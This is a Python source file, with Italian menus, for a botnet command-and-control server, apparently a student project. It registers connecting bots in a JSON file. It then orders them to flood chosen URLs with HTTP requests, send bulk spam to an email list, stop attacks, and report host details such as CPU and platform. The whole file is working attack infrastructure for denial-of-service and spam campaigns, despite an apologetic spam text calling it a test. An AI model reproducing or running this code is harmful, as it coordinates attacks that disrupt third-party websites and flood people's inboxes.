import concurrent
import json
import socket
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor

import requests

server_address = ('10.0.2.15', 15200)
# server_address = ('localhost', 15200)
bots = []


def write_on_json_file():
    with open("bot-db.json", "w") as f:
        if len(bots) == 0:
            f.write("")
            return
        json.dump(bots, f)


def initialize_bot_list():
    with open("bot-db.json", "r") as f:
        if data := f.read():
            bots = json.loads(data)
            for bot in bots:
                if check_bot_is_active(bot):
                    bots.append((bot[0], bot[1]))
    write_on_json_file()


def initialize(e):
    """
    Initialize the server and listen for incoming connections.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_address[0], server_address[1]))
    s.listen(5)
    s.settimeout(2)

    initialize_bot_list()

    while not e.is_set():
        try:
            client, address = s.accept()
            data = client.recv(1024)

            data = json.loads(data.decode('utf-8'))

            bot = (address[0], data['port'])

            if bot not in bots:
                bots.append(bot)
                write_on_json_file()

        except socket.timeout:
            continue


def start_server():
    """
    Start a thread for the server and a thread to handle console input.
    It will wait for both threads to finish before exiting the program.
    """
    event = Event()
    with ThreadPoolExecutor(max_workers=2) as executor:
        x = executor.submit(initialize, event)
        y = executor.submit(handle_console, event)

        # Check if both threads are done
        concurrent.futures.wait([x, y], return_when=concurrent.futures.FIRST_COMPLETED)

        executor.shutdown(wait=False)


def handle_console(e):
    """
    Handle console input from the user.
    """
    while not e.is_set():
        print("1. Mostra tutti i bot connessi")
        print("2. Effettua richieste http")
        print("3. Ferma attacco")
        print("4. Mostra informazioni di un bot")
        print("5. Avvia mail spam")
        print("6. Controlla lo stato dei bot")
        print("7. Rimuovi tutti i bot inattivi")
        print("0. Exit")

        try:
            scelta = int(input())
        except ValueError:
            print("Scelta non valida")
            continue

        if scelta == 0:
            print("Exiting...")
            write_on_json_file()
            e.set()
            return
        elif scelta == 1:
            get_all_clients()
        elif scelta == 2:
            send_http_request()
        elif scelta == 3:
            find_bot(path='stop-attack', method="GET")
        elif scelta == 4:
            find_bot(path='client-info', method="GET")
        elif scelta == 5:
            mail_spam()
        elif scelta == 6:
            bot_status()
        elif scelta == 7:
            rimuovi_bot_inattivi()
        else:
            print("Scelta non valida")


def get_all_clients():
    """
    Print all the clients connected to the server
    """
    if len(bots) == 0:
        print("--------------------------------------")
        print("Nessun bot connesso")
        print("--------------------------------------")
        return

    print("--------------------------------------")
    print("Numero di bot connessi: ", len(bots))
    print("--------------------------------------")
    for key, bot in enumerate(bots):
        print(f'Bot {key + 1}: {bot}')
        print("--------------------------------------")


def send_http_request():
    """
    Start the attack of all the bots or of a specific bot
    """

    with open("urls-db.txt", "r") as f:
        urls = f.read().split("\n")
        urls = [url for url in urls if url != ""]
        if not urls:
            print("Nessun URL da attaccare")
            return

        print("Seleziona un URL da attaccare: ")
        for key, url in enumerate(urls):
            print(f"{key + 1}. {url}")

        url = urls[int(input()) - 1]

        find_bot(path='attack', method="POST", j={
            'url': url
        })


def print_client_info(client, res):
    print(f"Client Ip: {client}")
    print(f"CPU: {res.json()['cpu']}")
    print(f"Machine: {res.json()['machine']}")
    print(f"Platform: {res.json()['platform']}")
    print(f"System: {res.json()['system']}")
    print("--------------------")


def mail_spam():
    with open("spam-db.txt", "r") as f:
        emails = f.read().split("\n")
        emails = [email for email in emails if email != ""]

        mail_object = "Spam email"
        message = "I'm so sorry for this spam email, but I'm testing my botnet. Please don't report me, I'm just a " \
                  "student. Thank you for your understanding."

        number_of_mails = int(input("Quante email vuoi inviare? "))

        if number_of_mails < 1:
            print("Numero di email non valido")
            return

        data = {
            "emails": emails,
            "message": message,
            "mail_object": mail_object,
            "number_of_emails": number_of_mails
        }
        find_bot(path='mail-spam', method="POST", j=data)


def find_bot(path, method, j=None):
    if len(bots) == 0:
        print("Nessun bot connesso")
        return

    if input("Voi utilizzare tutti i bot connessi? S/n: ") in ["S", "s", ""]:
        if method == "GET":
            for bot in bots:
                res = requests.get(f"http://{bot[0]}:{bot[1]}/{path}")
                if path == "client-info":
                    print_client_info(bot, res)
        elif method == "POST":
            for bot in bots:
                requests.post(f"http://{bot[0]}:{bot[1]}/{path}", json=j)
    else:
        bot_ip = input("Inserisci l'Ip del bot: ")
        c = next((bot for bot in bots if bot[0] == bot_ip), None)
        if c is None:
            print("Bot non trovato")
            return
        else:
            if method == "GET":
                res = requests.get(f"http://{c[0]}:{c[1]}/{path}")
                if path == "/client-info":
                    print_client_info(c[0], res)
            elif method == "POST":
                requests.post(f"http://{c[0]}:{c[1]}/{path}", json=j)


def bot_status():
    """
    Check if a bot is still connected to the server.
    """
    for bot in bots:
        try:
            res = requests.get(f"http://{bot[0]}:{bot[1]}/status")

            if not res.json():
                print(f"Bot {bot} in attesa di comandi")
                continue
            print(f"Bot: {bot}")
            for op in res.json():
                print(f"Operation: {op['operation']}")
                for targets in op['targets']:
                    print(f"Target: {targets}")
            print("--------------------------------")
        except requests.exceptions.ConnectionError:
            print(f"Bot {bot} disconnesso")
            bots.remove(bot)


def rimuovi_bot_inattivi():
    """
    Remove all the inactive bots
    """
    for bot in bots:
        if not check_bot_is_active(bot):
            print(f"Bot {bot} disconnesso")
            bots.remove(bot)
    write_on_json_file()

def check_bot_is_active(bot):
    try:
        res = requests.get(f"http://{bot[0]}:{bot[1]}/status")
        return res.status_code == 200
    except requests.exceptions.ConnectionError:
        return False


if __name__ == '__main__':
    start_server()
